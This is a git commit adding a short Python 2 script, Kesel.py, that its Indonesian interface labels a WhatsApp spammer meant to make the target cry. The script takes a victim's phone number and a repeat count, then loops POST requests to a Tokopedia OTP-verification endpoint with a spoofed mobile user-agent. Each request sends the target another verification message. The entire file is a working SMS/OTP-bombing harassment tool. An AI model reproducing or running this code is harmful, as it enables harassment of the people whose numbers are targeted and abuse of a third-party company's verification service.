9e1389ef5c4ec832d34bc7f00925c9b3f78ce383
Ryzz_ D1P5EY <73215831+Ryzz03@users.noreply.github.com>
2020-10-23 10:47:44 +0800

    Create Kesel.py

---
+++ Kesel.py
@@ -0,0 +1,33 @@
+# -*- coding: utf8 -*-
+# by Ryzz03
+import os, sys, json
+import requests as r
+C0 = '\033[0;36m'
+G0 = '\033[0;32m'
+W0 = '\033[0;37m'
+R0 = '\033[0;31m'
+Y0 = '\033[0;33m'
+try:
+ os.system("clear")
+ print """%s
+ 
+ %sAuthor   : Ryzz%s
+ %sWhatsApp : github.com/Ryzz03%s
+ %s============================%s
+ %sSpam Whatsapp AutoNangis"""%(G0,W0,G0,W0,G0,W0,G0,G0)
+ gg = raw_input("%s[%s?%s] %sIsi nomornya targer kak (ex:0881xx) : "%(W0,C0,W0,W0))
+ gi = int(raw_input("%s[%s?%s] %sMau ngirim berapa? : "%(W0,C0,W0,W0)))
+ c = 1
+ for x in range(gi):
+  h = json.loads(r.post("https://www.tokopedia.com/otp-validation?p_p_id=SB_Registration_Otp_Portlet&p_p_lifecycle=2&p_p_state=normal&p_p_mode=view&p_p_resource_id=sendVerificationCode&p_p_cacheability=cacheLevelPage&_SB_Registration_Otp_Portlet_mobilePhoneNo=%s"%gg,headers={'user-agent':'Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36'}).text)
+  if h["status"] == 'success':
+   print "%s[%s%s%s] %sBERHASIL %sdikirim ke %s%s"%(W0,C0,str(c),W0,G0,W0,Y0,gg)
+   c += 1
+  else:
+   print "%s[%s%s%s] %sGAGAL %sdikirim ke %s%s"%(W0,C0,str(c),W0,R0,W0,Y0,gg)
+   c += 1
+# print (h)
+except r.exceptions.ConnectionError:
+   print "%s[%s!%s] %sKoneksi buruk, Coba lagi nanti"%(W0,C0,W0,R0)
+except KeyboardInterrupt:
+   print "\r%s[%s-%s] %sNtar aja yah :)"%(W0,C0,W0,W0)
